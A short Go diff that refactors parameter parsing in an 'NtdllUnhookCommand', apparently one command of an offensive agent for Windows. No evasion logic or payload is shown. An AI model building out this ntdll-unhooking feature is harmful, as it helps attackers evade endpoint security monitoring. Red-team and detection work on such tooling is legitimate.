@@ -4,7 +4,6 @@
 package commands
 
 import (
-	"encoding/json"
 	"fmt"
 	"runtime"
 	"strings"
@@ -88,11 +87,9 @@ func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: This command is only supported on Windows")
 	}
 
-	var args ntdllUnhookArgs
-	if task.Params != "" {
-		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return errorf("Error parsing parameters: %v", err)
-		}
+	args, parseErr := unmarshalParams[ntdllUnhookArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if args.Action == "" {
